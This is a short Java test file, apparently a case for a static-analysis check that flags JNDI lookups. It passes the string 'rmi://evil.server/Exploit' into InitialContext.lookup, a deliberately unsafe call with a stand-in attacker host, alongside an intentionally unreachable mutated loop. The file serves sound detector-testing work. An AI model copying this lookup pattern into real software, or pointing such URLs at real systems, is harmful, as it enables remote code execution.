import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    private boolean getCondition() {
        return false;
    }

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();
        boolean conditionFor = getCondition();
        for (int i = 0; conditionFor; i++) {       // Mutated code: Unreachable for loop
            System.out.println("This loop is unreachable.");
        }
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}